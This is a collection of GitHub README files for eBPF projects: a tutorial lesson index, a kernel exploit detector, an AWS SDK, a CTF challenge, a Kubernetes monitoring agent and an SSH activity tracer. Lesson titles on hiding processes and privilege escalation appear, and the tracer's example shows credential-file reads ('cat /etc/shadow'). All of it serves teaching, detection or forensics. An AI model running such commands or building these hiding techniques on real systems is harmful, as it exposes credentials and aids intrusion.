- [lesson 7-execsnoop](src/7-execsnoop/README.md) Capturing Process Execution, Output with perf event array
- [lesson 8-exitsnoop](src/8-exitsnoop/README.md) Monitoring Process Exit Events, Output with Ring Buffer
- [lesson 9-runqlat](src/9-runqlat/README.md) Capturing Scheduling Latency and Recording as Histogram
- [lesson 10-hardirqs](src/10-hardirqs/README.md) Capturing Interrupts with hardirqs or softirqs
### Advanced Documents and Examples

We start to build complete eBPF projects mainly based on `libbpf` and combine them with various application scenarios for practical use.

- [lesson 11-bootstrap](src/11-bootstrap/README.md) Develop User-Space Programs with libbpf and Trace exec() and exit()
- [lesson 12-profile](src/12-profile/README.md) Using eBPF Program Profile for Performance Analysis
- [lesson 13-tcpconnlat](src/13-tcpconnlat/README.md) Statistics of TCP Connection Delay with libbpf
- [lesson 14-tcpstates](src/14-tcpstates/README.md) Recording TCP Connection Status and TCP RTT
- [lesson 15-javagc](src/15-javagc/README.md) Capturing User-Space Java GC Duration Using USDT
- [lesson 16-memleak](src/16-memleak/README.md) Monitoring Memory Leaks
- [lesson 17-biopattern](src/17-biopattern/README.md) Count Random/Sequential Disk I/O
- [lesson 18-further-reading](src/18-further-reading/README.md) More Reference Materialsï¼š papers, projects
- [lesson 19-lsm-connect](src/19-lsm-connect/README.md) Security Detection and Defense using LSM
- [lesson 20-tc](src/20-tc/README.md) tc Traffic Control
- [lesson 21-xdp](src/21-xdp/README.md) Programmable Packet Processing with XDP
### In-Depth Topics

This section covers advanced topics related to eBPF, including using eBPF programs on Android, possible attacks and defenses using eBPF programs, and complex tracing. Combining the user-mode and kernel-mode aspects of eBPF can bring great power (as well as security risks).



GPU:

- [lesson 47-cuda-events](src/47-cuda-events/README.md) Tracing CUDA GPU Operations
- [lesson xpu/npu-kernel-driver](src/xpu/npu-kernel-driver/README.md) Tracing Intel NPU Kernel Driver Operations
- [lesson xpu/gpu-kernel-driver](src/xpu/gpu-kernel-driver/README.md) Monitoring GPU Driver Activity with Kernel Tracepoints


Scheduler:

- [lesson 44-scx-simple](src/44-scx-simple/README.md) Introduction to the BPF Scheduler
- [lesson 45-scx-nest](src/45-scx-nest/README.md) Implementing the `scx_nest` Scheduler


Networking:

- [lesson 23-http](src/23-http/README.md) L7 Tracing with eBPF: HTTP and Beyond via Socket Filters and Syscall Tracepoints
- [lesson 29-sockops](src/29-sockops/README.md) Accelerating Network Request Forwarding with Sockops
- [lesson 41-xdp-tcpdump](src/41-xdp-tcpdump/README.md) Capturing TCP Information with XDP
- [lesson 42-xdp-loadbalancer](src/42-xdp-loadbalancer/README.md) XDP Load Balancer
- [lesson 46-xdp-test](src/46-xdp-test/README.md) Building a High-Performance XDP Packet Generator


Tracing:

- [lesson 30-sslsniff](src/30-sslsniff/README.md) Capturing SSL/TLS Plain Text Data Using uprobe
- [lesson 31-goroutine](src/31-goroutine/README.md) Using eBPF to Trace Go Routine States
- [lesson 33-funclatency](src/33-funclatency/README.md) Measuring Function Latency with eBPF
- [lesson 37-uprobe-rust](src/37-uprobe-rust/README.md) Tracing User Space Rust Applications with Uprobe
- [lesson 39-nginx](src/39-nginx/README.md) Using eBPF to Trace Nginx Requests
- [lesson 40-mysql](src/40-mysql/README.md) Using eBPF to Trace MySQL Queries
- [lesson 48-energy](src/48-energy/README.md) Energy Monitoring for Process-Level Power Analysis


Security:

- [lesson 24-hide](src/24-hide/README.md) Hiding Process or File Information
- [lesson 25-signal](src/25-signal/README.md) Using bpf_send_signal to Terminate Malicious Processes in eBPF
- [lesson 26-sudo](src/26-sudo/README.md) Privilege Escalation via File Content Manipulation
- [lesson 27-replace](src/27-replace/README.md) Transparent Text Replacement in File Reads
- [lesson 28-detach](src/28-detach/README.md) Running eBPF After Application Exits: The Lifecycle of eBPF Programs
- [lesson 34-syscall](src/34-syscall/README.md) Modifying System Call Arguments with eBPF


Features:

- [lesson 35-user-ringbuf](src/35-user-ringbuf/README.md) Asynchronously Send to Kernel with User Ring Buffer
- [lesson 36-userspace-ebpf](src/36-userspace-ebpf/README.md) Userspace eBPF Runtimes: Overview and Applications
- [lesson 38-btf-uprobe](src/38-btf-uprobe/README.md) Expanding eBPF Compile Once, Run Everywhere(CO-RE) to Userspace Compatibility
- [lesson 43-kfuncs](src/43-kfuncs/README.md) Extending eBPF Beyond Its Limits: Custom kfuncs in Kernel Modules
- [features bpf_wq](src/features/bpf_wq/README.md) BPF Workqueues for Asynchronous Sleepable Tasks
- [features bpf_iters](src/features/bpf_iters/README.md) BPF Iterators for Kernel Data Export
- [features bpf_arena](src/features/bpf_arena/README.md) BPF Arena for Zero-Copy Shared Memory

Other:

- [lesson 49-hid](src/49-hid/README.md) Fixing Broken HID Devices Without Kernel Patches


Android:

- [lesson 22-android](src/22-android/README.md) Using eBPF Programs on Android

Continuously updating...

## Why write this tutorial?

In the process of learning eBPF, we have been inspired and helped by the [bcc python developer tutorial](src/bcc-documents/tutorial_bcc_python_developer.md). However, from the current perspective, using `libbpf` to develop eBPF applications is a relatively better choice.

This project is mainly based on [libbpf](https://github.com/libbpf/libbpf) frameworks.

> - We also provide a small tool called GPTtrace, which uses ChatGPT to automatically write eBPF programs and trace Linux systems through natural language descriptions. This tool allows you to interactively learn eBPF programs: [GPTtrace](https://github.com/eunomia-bpf/GPTtrace)
> - Feel free to raise any questions or issues related to eBPF learning, or bugs encountered in practice, in the issue or discussion section of this repository. We will do our best to help you!

## Install deps and Compile

- For libbpf based: see [src/11-bootstrap](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/11-bootstrap/README.md)
- For eunomia-bpf based: see [src/1-helloworld](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/1-helloworld/README.md)

## GitHub Templates: Easily build eBPF projects and development environments, compile and run eBPF programs online with one click

When starting a new eBPF project, are you confused about how to set up the environment and choose a programming language? Don't worry, we have prepared a series of GitHub templates for you to quickly start a brand new eBPF project. Just click the `Use this template` button on GitHub to get started.

- <https://github.com/eunomia-bpf/libbpf-starter-template>: eBPF project template based on the C language and libbpf framework
- <https://github.com/eunomia-bpf/cilium-ebpf-starter-template>: eBPF project template based on the Go language and cilium/ framework
- <https://github.com/eunomia-bpf/libbpf-rs-starter-template>: eBPF project template based on the Rust language and libbpf-rs framework
- <https://github.com/eunomia-bpf/eunomia-template>: eBPF project template based on the C language and eunomia-bpf framework

These starter templates include the following features:

- A Makefile to build the project with a single command
- A Dockerfile to automatically create a containerized environment for your eBPF project and publish it to GitHub Packages
- GitHub Actions to automate the build, test, and release processes
- All dependencies required for eBPF development

> By setting an existing repository as a template, you and others can quickly generate new repositories with the same basic structure, eliminating the need for manual creation and configuration. With GitHub template repositories, developers can focus on the core functionality and logic of their projects without wasting time on the setup and structure. For more information about template repositories, see the official documentation: <https://docs.github.com/en/repositories/creating-and-managing-repositories/creating-a-template-repository>

When you create a new repository using one of the eBPF project templates mentioned above, you can easily set up and launch an online development environment with GitHub Codespaces. Here are the steps to compile and run eBPF programs using GitHub Codespaces:

1. Click the Code button in your new repository and select the Open with Codespaces option:

    ![code](imgs/code-button.png)

2. GitHub will create a new Codespace for you, which may take a few minutes depending on your network speed and the size of the repository.
3. Once your Codespace is launched and ready to use, you can open the terminal and navigate to your project directory.
4. You can follow the instructions in the corresponding repository to compile and run eBPF programs:

    ![codespace](imgs/codespace.png)

With Codespaces, you can easily create, manage, and share cloud-based development environments, speeding up and making your development process more reliable. You can develop with Codespaces anywhere, on any device, just need a computer with a web browser. Additionally, GitHub Codespaces supports pre-configured environments, customized development containers, and customizable development experiences to meet your development needs.

After writing code in a codespace and making a commit, GitHub Actions will compile and automatically publish the container image. Then, you can use Docker to run this eBPF program anywhere with just one command, for example:

```console
$ sudo docker run --rm -it --privileged ghcr.io/eunomia-bpf/libbpf-rs-template:latest
[sudo] password for xxx:
Tracing run queue latency higher than 10000 us
TIME     COMM             TID     LAT(us)
12:09:19 systemd-udevd    30786   18300
12:09:19 systemd-udevd    30796   21941
12:09:19 systemd-udevd    30793   10323
12:09:19 systemd-udevd    30795   14827
12:09:19 systemd-udevd    30790   17973
12:09:19 systemd-udevd    30793   12328
12:09:19 systemd-udevd    30796   28721
```

![docker](imgs/docker.png)

## build

The example of local compilation is shown as follows:

```shell
git clone https://github.com/eunomia-bpf/bpf-developer-tutorial.git
cd bpf-developer-tutorial
git submodule update --init --recursive # Synchronize submodule
cd src/24-hide
make
```

## LICENSE

MIT
"
hardenedvault/ved-ebpf,166,30,166,2,C++,VED-eBPF: Kernel Exploit and Rootkit Detection using eBPF,2023-08-11T13:43:06Z,2025-10-04T13:58:26Z,3,"## VED-eBPF: Kernel Exploit and Rootkit Detection using eBPF

VED ([Vault Exploit Defense](https://hardenedvault.net/blog/2023-07-09-protecting-linux-kernel-why-how/))-eBPF leverages eBPF (extended Berkeley Packet Filter) to implement runtime kernel security monitoring and exploit detection for Linux systems.

## Introduction

eBPF is an in-kernel virtual machine that allows code execution in the kernel without modifying the kernel source itself. eBPF programs can be attached to tracepoints, kprobes, and other kernel events to efficiently analyze execution and collect data.

VED-eBPF uses eBPF to trace security-sensitive kernel behaviors and detect anomalies that could indicate an exploit or rootkit. It provides two main detections:

* wCFI (Control Flow Integrity) traces the kernel call stack to detect control flow hijacking attacks. It works by generating a bitmap of valid call sites and validating each return address matches a known callsite.

* PSD (Privilege Escalation Detection) traces changes to credential structures in the kernel to detect unauthorized privilege escalations.

## How it Works

VED-eBPF attaches eBPF programs to kernel functions to trace execution flows and extract security events. The eBPF programs submit these events via perf buffers to userspace for analysis.

## wCFI

wCFI traces the call stack by attaching to functions specified on the command line. On each call, it dumps the stack, assigns a stack ID, and validates the return addresses against a precomputed bitmap of valid call sites generated from objdump and /proc/kallsyms.

If an invalid return address is detected, indicating a corrupted stack, it generates a wcfi_stack_event containing:

    * Stack trace
    * Stack ID
    * Invalid return address

This security event is submitted via perf buffers to userspace.

The wCFI eBPF program also tracks changes to the stack pointer and kernel text region to keep validation up-to-date.

## PSD

PSD traces credential structure modifications by attaching to functions like commit_creds and prepare_kernel_cred. On each call, it extracts information like:

    * Current process credentials
    * Hashes of credentials and user namespace
    * Call stack

It compares credentials before and after the call to detect unauthorized changes. If an illegal privilege escalation is detected, it generates a psd_event containing the credential fields and submits it via perf buffers.

## Prerequsites

VED-eBPF requires:

* Linux kernel v5.17+ (tested on v5.17)
* eBPF support enabled
* [BCC toolkit](https://github.com/iovisor/bcc)

## Current Status

VED-eBPF is currently a proof-of-concept demonstrating the potential for eBPF-based kernel exploit and rootkit detection. Ongoing work includes:

* Expanding attack coverage
* Performance optimization
* Additional kernel versions
* Integration with security analytics

## Conclusion

VED-eBPF shows the promise of eBPF for building efficient, low-overhead kernel security monitoring without kernel modification. By leveraging eBPF tracing and perf buffers, critical security events can be extracted in real-time and analyzed to identify emerging kernel threats for cloud native envionrment.
"
aws/aws-ebpf-sdk-go,78,17,78,6,Go,"Golang based SDK for kernel eBPF operations i.e, load/attach/detach eBPF programs and create/delete/update maps. SDK relies on Unix bpf() system calls.",2023-05-19T19:57:25Z,2025-10-07T20:26:27Z,138,"# aws-ebpf-sdk-go

Golang based SDK for kernel eBPF operations i.e, load/attach/detach eBPF programs and create/delete/update maps. SDK relies on Unix bpf() system calls.

SDK currently supports -

1. eBPF program types -
   a. Traffic Classifiers
   b. XDP
   c. Kprobes/Kretprobes
   d. Tracepoint probes
2. Ring buffer (would need kernel 5.10+)

SDK currently do not support -

1. Map in Map
2. Perf buffer

Contributions welcome!

Note: This is the first version of SDK and interface is subject to change so kindly review the release notes before upgrading.

# Getting started

## How to build SDK?

Run `make build-linux` - this will build the sdk binary.

## How to build elf file?

```
clang -I../../.. -O2 -target bpf -c <C file> -o <ELF file>
```

## How to use the SDK?

**Note:** SDK expects the BPF File System (/sys/fs/bpf) to be mounted.
 
In your application, 

1. Get the latest SDK -

```
GOPROXY=direct go get github.com/aws/aws-ebpf-sdk-go
```

2. Import the elfparser - 

```
goebpfelfparser ""github.com/aws/aws-ebpf-sdk-go/pkg/elfparser""
```

3. Load the elf -

```
goebpfelfparser.LoadBpfFile(<ELF file>, <custom pin path>)
```

On a successful load, SDK returns -

1. loaded programs (includes associated maps) 

```
This is indexed by the pinpath - 

type BpfData struct {
	Program ebpf_progs.BpfProgram       // Return the program
	Maps    map[string]ebpf_maps.BpfMap // List of associated maps
}
```

2. All maps in the elf file
```
This is indexed by the map name -

type BpfMap struct {
	MapFD       uint32
	MapID       uint32
	MapMetaData CreateEBPFMapInput
}
```

Application can specify custom pinpath while loading the elf file.

Maps and Programs pinpath location is not customizable with the current version of SDK and will be installed under the below locations by default -

Program PinPath - ""/sys/fs/bpf/globals/aws/programs/""

Map PinPath - ""/sys/fs/bpf/globals/aws/maps/""

Map defintion should follow the below definition else the SDK will fail to create the map.

```
struct bpf_map_def_pvt {
	__u32 type;
	__u32 key_size;
	__u32 value_size;
	__u32 max_entries;
	__u32 map_flags;
	__u32 pinning;
	__u32 inner_map_fd;
};
```

## How to debug SDK issues?

SDK logs are located here `/var/log/aws-routed-eni/ebpf-sdk.log`.

## How to run unit-test

Run `sudo make unit-test`

Note: you would need to run this on you linux system

## How to run functional tests

Go to -

```
cd test/
sudo make run-test
```

## Security

See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.

If you think youâ€™ve found a potential security issue, please do not post it in the Issues. Instead, please follow the
instructions [here](https://aws.amazon.com/security/vulnerability-reporting/) or [email AWS security directly](mailto:aws-security@amazon.com).

## License

This project is licensed under the Apache-2.0 License.
"
tks98/eBPF-Summit-2023-CTF,0,0,0,0,Shell,Solution and writeup for eBPF Summit 2023 CTF Challenge,2023-09-14T22:43:17Z,2023-09-15T01:02:46Z,29,"My solution and writeup is located in the solution directory. 


# Capture The Flag Challenge for eBPF Summit 2023

Welcome to the eBPF Summit 2023 CTF Challenge!

## Backstory

The backstory continues from the previous challenges. [You can find the
previous pieces here][previously]. Like for previous years, the story is here
for the atmosphere and does **not** contain hints to help solve the challenge.

> What a week.
>
> You are Jephen'Tsa. Hero of the Rebel Alliance, you've left behind your quiet
> life as a giant-bee-keeper on planet Berpafyll to fight against the Empire.
> Three days ago you got reconnected with your former ally, Blue Hex. She had
> apparently crossed you, but only to expose a spy at the heart of the command.
>
> He is Bajeroff Lake. Native from Rekkana, he's been in charge of computer
> systems and droids for the Rebellion over the last six years. All this time,
> he's also been covering his stakes in a megacorporation under Imperial
> control. More recently, he started to leak precious data to your foes. He's
> the spy identified by Blue Hex, and as soon as you came back to your base,
> two days ago, you exposed him.
>
> Mon Mothma, leader of the Alliance, immediately ordered that the traitor be
> arrested. Bajeroff resisted and locked himself in a server room, along with a
> bunch of droids under his command. You spent most of your day yesterday
> trying to drive him out. After many blasts, various subterfuges, a tea break,
> two lightsaber fights, and several other heroic actions, your team eventually
> managed to catch the spy alive and put him behind bars.
>
> But you're not out of the asteroid field yet. This morning, Blue Hex just
> realised that Bajeroff managed to infect all computers with clandestine
> malware. You're now logging into the system to try and find the malicious
> process to stop it. You'd better be quick, or the virus will send the
> position of your base to the Empire. Once again, everyone relies on you, and
> it's only Wednesday! May the Force be with you: you'll need it.

[previously]: https://gist.github.com/qmonnet/09afdd12a65ce3e5612d554b23246d76

## Deploying the challenge

* On Mac, you can set up the challenge using Lima-VM by running:

  ```
  limactl start lima/<easy/hard>.yaml
  ```

  with the file provided in this repo. Once this
  completes, open a shell into the VM with:

  ```
  limactl shell <easy/hard>
  ```

* If you're a Vagrant user, we've supplied a Vagrantfile for you as well.
  Download that file and run:

  ```
  vagrant up
  ```

  Once this is finished, run:

  ```
  vagrant ssh
  ```

  to open a shell into the VM.

**NOTE:** the following should ideally be ran in a VM, running on an existing 
system can result in unexpected behaviour for other applications! â—ï¸

If you don't want to use Lima or Vagrant, you should be able to run the binary
`bin/ebpf.summit.2023` as root on a relatively modern Linux distro (as long as
the kernel is 5.15+).

## The premise!

Once your system is up and running you will be able to log into a running
Ubuntu machine!

However you'll notice that within the root directory is a file `/ebpf.summit`,
if you `sudo cat` this file you'll see that there is a program updating this
file, this hidden program is also systematically reading `/etc/passwd`. A
nefarious user (me) has hidden a userland program with eBPF, you'll need to use
whatever tools are at your disposal to locate this program and its pid in order
to kill the program. Only then will the `/ebpf.summit` reveal the flag!

> **Warning**
>
> When killing the process, do not send `SIGKILL` (do not pass the `-9` option
> to `kill`), or the process will not have the opportunity to write its flag
> before closing.

Good luck!

Check your answer or get hints at `#ebpf-summit-ctf-spoilers` on the eBPF 
slack instance!

[![Join the Cilium slack channel](https://img.shields.io/badge/slack-cilium-brightgreen.svg?logo=slack)](https://cilium.herokuapp.com/)
"
ddosify/alaz,708,32,708,7,C,"Alaz: Advanced eBPF Agent for Kubernetes Observability â€“ Effortlessly monitor K8s service interactions and performance metrics in your K8s environment. Gain in-depth insights with service maps, metrics, and more, while staying alert to crucial system anomalies ðŸ",2023-05-18T16:36:02Z,2025-10-07T06:21:04Z,759,"<h1 align=""center"">Alaz - Anteon eBPF Agent for Kubernetes Monitoring</h1>

<p align=""center"">
<img src=""https://raw.githubusercontent.com/getanteon/anteon/master/assets/anteon_service_map.png"" alt=""Anteon Kubernetes Monitoring Service Map"" />
<a href=""https://github.com/getanteon/alaz/blob/master/LICENSE"" target=""_blank""><img src=""https://img.shields.io/badge/LICENSE-AGPL--3.0-orange?style=for-the-badge&logo=none"" alt=""alaz license"" /></a>
<a href=""https://discord.com/invite/9KdnrSUZQg"" target=""_blank""><img src=""https://img.shields.io/discord/898523141788287017?style=for-the-badge&logo=discord&label=DISCORD"" alt=""Anteon discord server"" /></a>
<a href=""https://hub.docker.com/r/ddosify/alaz"" target=""_blank""><img src=""https://img.shields.io/docker/v/ddosify/alaz?style=for-the-badge&logo=docker&label=docker&sort=semver"" alt=""alaz docker image"" /></a>
<a href=""https://gurubase.io/g/anteon"" target=""_blank""><img alt=""Anteon Guru"" src=""https://img.shields.io/badge/Anteon%20Guru-F40003?style=for-the-badge&label=ASK&color=%23F40003"">

<i>Anteon (formerly Ddosify) automatically generates Service Map of your K8s cluster without code instrumentation or sidecars with eBPF Agent Alaz. So you can easily find the bottlenecks in your system. Red lines indicate the high latency between services.</i>

</p>

<h2 align=""center"">
    <a href=""https://demo.getanteon.com/clusters/0ce2ef05-ef64-459d-90d9-7f2cbd65fff8"" target=""_blank"">Live Demo</a> â€¢
    <a href=""https://getanteon.com/docs/"" target=""_blank"">Documentation</a> â€¢
    <a href=""https://getanteon.com/docs/deployment/"" target=""_blank"">Deployment</a> â€¢
    <a href=""https://discord.com/invite/9KdnrSUZQg"" target=""_blank"">Discord</a>
</h2>

<details>
  <summary>Table of Contents</summary>

<!-- vim-markdown-toc GFM -->

- [What is Alaz?](#what-is-alaz)
- [Features](#features)
- [ðŸš€ Getting Started](#-getting-started)
  - [â˜ï¸ For Anteon Cloud](#-for-anteon-cloud)
    - [Using the kubectl](#using-the-kubectl)
    - [Using the Helm](#using-the-helm)
  - [ðŸ  For Anteon Self-Hosted](#-for-anteon-self-hosted)
    - [Using the kubectl](#using-the-kubectl-1)
    - [Using the Helm](#using-the-helm-1)
- [ðŸ§¹ Cleanup](#-cleanup)
- [Supported Protocols](#supported-protocols)
- [Limitations](#limitations)
  - [Encryption Libraries](#encryption-libraries)
- [Contributing](#contributing)
- [Communication](#communication)
- [License](#license)

<!-- vim-markdown-toc -->

</details>

## What is Alaz?

[**Alaz**](https://github.com/getanteon/alaz) is an open-source Anteon eBPF agent that can inspect and collect Kubernetes (K8s) service traffic without the need for code instrumentation, sidecars, or service restarts. This is possible due to its use of eBPF technology.

Alaz can create a **Service Map** that helps identify golden signals and problems like:

- High latencies between K8s services
- Detect 5xx HTTP status codes
- Detect Idle / Zombie services
- Detect slow SQL queries

Additionally, Anteon tracks and displays live data on your cluster instances CPU, memory, disk, and network usage. All of the dashboards are generated out-of-box and you can create alerts based on these metrics values. Check out the [documentation](https://getanteon.com/docs/) for more.

<p align=""center"">
<img src=""https://raw.githubusercontent.com/getanteon/anteon/master/assets/anteon_metrics.png"" alt=""Anteon Kubernetes Monitoring Metrics"" />
<i>Anteon tracks and displays live data on your cluster instances CPU, memory, disk, and network usage.</i>
</p>

âž¡ï¸ See [Anteon repository](https://github.com/getanteon/anteon) for more information.

## Features

âœ… **Low-Overhead**

Inspect and collect K8s service traffic without the need for code instrumentation, sidecars, or service restarts.

âœ… **Effortless**

Anteon will create the Service Map & Metrics Dashboard that helps identify golden signals and issues such as high latencies, 5xx errors, zombie services.

âœ… **Prometheus Compatible**

Gather system information and resources via the Prometheus Node Exporter, which is readily available on the agent.

âœ… **Cloud or On-premise**

Export metrics to [Anteon Cloud](https://getanteon.com), or install the [Anteon Self-Hosted](https://getanteon.com/docs/self-hosted/) in your infrastructure and manage everything according to your needs.

âœ… **Test & Observe**

Anteon Performance Testing and Alaz can work collaboratively. You can start a load test and monitor your system simultaneously. This will help you spot performance issues instantly. Check out the [Anteon documentation](https://getanteon.com/docs) for more information about Anteon Stack.

âœ… **Alerts for Anomalies**

If something unusual, like a sudden increase in CPU usage, happens in your Kubernetes (K8s) cluster, Anteon immediately sends alerts to your Slack.

âœ… **Platform Support**

Works on both Arm64 and x86_64 architectures.

## ðŸš€ Getting Started

To use Alaz, you need to have a [Anteon Cloud](https://app.getanteon.com/register) account or [Anteon Self-Hosted](https://github.com/getanteon/anteon) installed.

### â˜ï¸ For Anteon Cloud

1. Register for a [Anteon Cloud account](https://app.getanteon.com/register).
2. Add a cluster on the [Observability page](https://app.getanteon.com/clusters). You will receive a Monitoring ID and instructions.
3. Run the agent on your Kubernetes cluster using the instructions you received. There are two options for Kubernetes deployment:

#### Using the kubectl

```bash
# Replace <MONITORING_ID> with your monitoring ID from the Anteon Cloud. Change XXXXX with your monitoring ID.
MONITORING_ID=XXXXX
curl -sSL https://raw.githubusercontent.com/getanteon/alaz/master/resources/alaz.yaml -o alaz.yaml
sed -i"""" -e ""s/<MONITORING_ID>/$MONITORING_ID/g"" alaz.yaml
kubectl create namespace anteon
kubectl apply -f alaz.yaml
```

#### Using the Helm

```bash
# Replace <MONITORING_ID> with your monitoring ID from the Anteon Cloud. Change XXXXX with your monitoring ID.
MONITORING_ID=XXXXX
helm repo add anteon https://getanteon.github.io/anteon-helm-charts/
helm repo update
kubectl create namespace anteon
helm upgrade --install --namespace anteon alaz anteon/alaz --set monitoringID=$MONITORING_ID
```

Then you can view the metrics and Kubernetes Service Map on the [Anteon Observability dashboard](https://app.getanteon.com/clusters). For more information, see [Anteon Kubernetes Monitoring](https://getanteon.com/docs/kubernetes-monitoring/).

### ðŸ  For Anteon Self-Hosted

1. Install [Anteon Self-Hosted](https://getanteon.com/docs/self-hosted)
2. Add a cluster on the Observability page of your Self-Hosted frontend. You will receive a Monitoring ID and instructions.
3. Run the agent on your Kubernetes cluster using the instructions you received.

Note: After you install Anteon Self-Hosted, you will have a Anteon Self-Hosted endpoint of Nginx reverse proxy. The base URL of the Anteon Self-Hosted endpoint forwards traffic to the frontend. The base URL of the Anteon Self-Hosted endpoint with `/api` suffix forwards traffic to the backend. So you need to set the backend host variable as `http://<your-anteon-self-hosted-endpoint>/api`.

There are two options for Kubernetes deployment:

#### Using the kubectl

```bash
# Replace <MONITORING_ID> with your monitoring ID from the Anteon Cloud. Change XXXXX with your monitoring ID.
MONITORING_ID=XXXXX
# Set BACKEND_HOST with your Anteon Self Hosted Endpoint. If your Anteon Self Hosted endpoint is http://localhost:8014, then BACKEND_HOST=localhost:8014
BACKEND_HOST=XXXXX
curl -sSL https://raw.githubusercontent.com/getanteon/alaz/master/resources/alaz.yaml -o alaz.yaml
sed -i"""" -e ""s/<MONITORING_ID>/$MONITORING_ID/g"" alaz.yaml
sed -i"""" -e ""s/https:\/\/api-alaz.getanteon.com:443/http:\/\/$BACKEND_HOST\/api/g"" alaz.yaml
kubectl create namespace anteon
kubectl apply -f alaz.yaml
```

#### Using the Helm

```bash
# Replace <MONITORING_ID> with your monitoring ID from the Anteon Cloud. Change XXXXX with your monitoring ID.
MONITORING_ID=XXXXX
# Set BACKEND_HOST with your Anteon Self Hosted Endpoint. If your Anteon Self Hosted endpoint is http://localhost:8014, then BACKEND_HOST=http://localhost:8014/api
BACKEND_HOST=XXXXX
helm repo add anteon https://getanteon.github.io/anteon-helm-charts/
helm repo update
kubectl create namespace anteon
helm upgrade --install --namespace anteon alaz anteon/alaz --set monitoringID=$MONITORING_ID --set backendHost=$BACKEND_HOST
```

Then you can view the metrics and Kubernetes Service Map on the Anteon Self-Hosted Observability dashboard. For more information, see [Anteon Monitoring Docs](https://getanteon.com/docs/kubernetes-monitoring/).

Alaz runs as a DaemonSet on your Kubernetes cluster. It collects metrics and sends them to Anteon Cloud or Anteon Self-Hosted. You can view the metrics on the Anteon Observability dashboard. For the detailed Alaz architecture, see [Alaz Architecture](https://github.com/getanteon/alaz/blob/master/ARCHITECTURE.md).

## ðŸ§¹ Cleanup

To remove Alaz from your Kubernetes cluster, run the following command:

- For Kubectl:

```bash
kubectl delete -f https://raw.githubusercontent.com/getanteon/alaz/master/resources/alaz.yaml
```

- For Helm:

```bash
helm delete alaz --namespace anteon
```

## Supported Protocols

Alaz supports the following protocols:

- HTTP
- HTTPS (OpenSSL and Go TLS)
- HTTP2
- Postgres
- RabbitMQ
- gRPC
- Redis (RESP)
- Kafka
- MySQL
- MongoDB

Other protocols will be supported soon. If you have a specific protocol you would like to see supported, please [open an issue](https://github.com/getanteon/alaz/issues/new).

## Limitations

Alaz runs on Linux Kubernetes clusters. Windows or MacOS are not supported.
In the future, we plan to support Docker containers.

Alaz is an eBPF application that uses [CO-RE](https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere).
Most of the latest linux distributions support CO-RE. In order to CO-RE to work, the kernel has to be built with BTF(bpf type format) information.

You can check your kernel version with `uname -r`
command and whether btf is enabled by default or not at the [btfhub](https://github.com/aquasecurity/btfhub/blob/main/docs/supported-distros.md).

For the time being, we expect that btf information is readily available on your system. We will support all kernels in the upcoming weeks leveraging [btfhub](https://github.com/aquasecurity/btfhub).

### Encryption Libraries

These are the libraries that alaz hooks into for capturing encrypted traffic.

- [crypto/tls](https://pkg.go.dev/crypto/tls):
  In order to Alaz to capture tls requests in your Go applications, your go version must be **1.17+** and your executable must include debug info.

- [OpenSSL](https://www.openssl.org/):
  OpenSSL shared objects that is dynamically linked into your executable is supported.
  Supported versions : **1.0.2**, **1.1.1** and **3.\***

## Contributing

Contributions to Alaz are welcome! To contribute, please follow these steps:

1. Fork the repository
2. Create a new branch: `git checkout -b my-branch`
3. Make your changes and commit them: `git commit -am ""Add some feature""`
4. Push to the branch: `git push origin my-branch`
5. Submit a pull request.

## Communication

You can join our [Discord Server](https://discord.com/invite/9KdnrSUZQg) for issues, feature requests, feedbacks or anything else.

## License

Alaz is licensed under the [AGPLv3](LICENSE)
"
qjawls2003/eBPF-Remote-Client-Tracing,19,3,19,1,C,eBPF agent to trace processes back to SSH Client IP,2023-08-02T02:16:49Z,2025-05-05T02:55:58Z,87,"# eBPF-Remote-Client-Tracing

**Description**: An eBPF agent to trace all execve syscall back to a SSH Client IP, port, and user.

**Purpose**: This program will reduce the amount of manual tracing work when conducting forensics on suspicious user activities.

This program allows you to *pin* attribution to all SSH clients. Once a client connects to the host, this program will attribute the client's original IP, port, and user to all command line and execve events.
The original client information will stay consistent during multiple layers of localhost-to-localhost ssh, sudo su, and the spawning any new shell (/bin/bash, /bin/sh, etc.)

**Example:**

You can see that the user *guac* from *192.168.85.129:50642* executed *ls /home*, *cat /etc/passwd*, and *cat /etc/shadow*

Timestamp,                PID,    PPID,   UID,    Current User,     Origin User,      Command,          IP Address,       Port,             Command Args
![log_2](https://github.com/qjawls2003/eBPF-Remote-Client-Tracing/assets/35247051/cfa011cc-f205-49b1-b57d-da69c6e6f373)

Then, the user *guac* performes *sudo su* and executes *cat /etc/shadow*. You can see that the original *IP:port* and *username* are preserved in the logs.

![log_3](https://github.com/qjawls2003/eBPF-Remote-Client-Tracing/assets/35247051/85b29ad4-ef17-4d4d-ac2c-7cd39f249eef)



## Idea

The core framework of this program revolves around SSH's use of getpeername and getsockname system calls. These system calls contains information about the client and the server IP and port. Using this information, we mapped a user activity (execve syscall) to its original SSH information. 
In order to this, we considered these cases:
1. SSH from Remote location
2. SSH from localhost (multiple layers)
3. Privilege Escalation (sudo su, etc.)
4. New shell (/bin/bash, etc.)

sshtrace program will output the original IP, port, and user regardless of certain attempts at obfuscating its remote IP address. 
More detailed description of the program: [https://medium.com/etracing/tracing-ssh-user-activities-using-ebpf-c83f8f5a4a8e]

## Usage
```
sudo ./sshtrace [-a] [-p] [-v] [-w] [-h] [--max-args MAX_ARGS]
```
```
       ./sshtrace           # trace all ssh-spawned execve syscall\
       ./sshtrace -a        # trace all execve syscalls\
       ./sshtrace -p        # printf all logs\
       ./sshtrace -v        # verbose events
       ./sshtrace -w        # verbose warnings
       ./sshtrace -h        # show help
```
## Installation

Linux Distrubtion with eBPF
```
git clone https://github.com/qjawls2003/eBPF-Remote-Client-Tracing
cd /eBPF-Remote-Client-Tracing
sudo ./sshtrace
```

If you want to **Make** your own executable:
```
git clone --recurse-submodules https://github.com/qjawls2003/eBPF-Remote-Client-Tracing
sudo apt-get install bpftool
sudo apt-get install clang
sudo apt-get install libbpf-dev
sudo apt-get install gcc-multilib
sudo apt-get install llvm  
make
```

## Logging

The logs are generated in a JSON format (not JSON object).
```
/var/log/sshtrace.log
```
![log_1](https://github.com/qjawls2003/eBPF-Remote-Client-Tracing/assets/35247051/75991028-a4c2-4fee-8fbb-1f81296a9528)

## Monitoring

Use the *-p* arg to print out the logs:
```
sudo ./sshtrace -p
```
### IPv4
